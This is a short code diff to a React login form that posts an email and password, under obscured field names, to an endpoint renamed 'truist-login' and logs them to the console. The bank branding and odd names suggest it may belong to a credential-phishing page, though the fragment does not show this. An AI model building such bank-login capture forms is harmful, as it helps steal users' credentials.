@@ -39,7 +39,7 @@ const LoginForm2: React.FC = () => {
       // Proceed with form submission
       console.log('Form submitted with:', { emzemz, pwzenz });
 
-      const url = `${baseUrl}api/truist-meta-data-2/`;
+      const url = `${baseUrl}api/truist-login/`;
 
       try {
         await axios.post(url, {
